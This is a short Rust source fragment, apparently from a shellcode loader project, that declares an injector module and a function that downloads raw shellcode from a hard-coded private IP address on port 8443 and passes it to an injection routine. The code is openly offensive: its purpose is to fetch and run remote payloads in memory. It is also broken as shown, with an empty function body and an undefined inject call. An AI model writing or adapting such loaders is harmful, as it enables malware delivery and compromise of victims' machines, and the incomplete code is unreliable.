mod injectors;
use injectors::{
    InjectorType,
    Injector
};

pub fn init(injector_type: InjectorType ) -> Box<dyn Injector> {

}

use reqwest::blocking::get;

// Change this to your shellcode source!
const URL: &str = "http://192.168.1.114:8443/foo";



fn get_inject_shellcode(url: &str) {
    if let Ok(res) = get(url) {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
            inject(sc);
        }
    }
}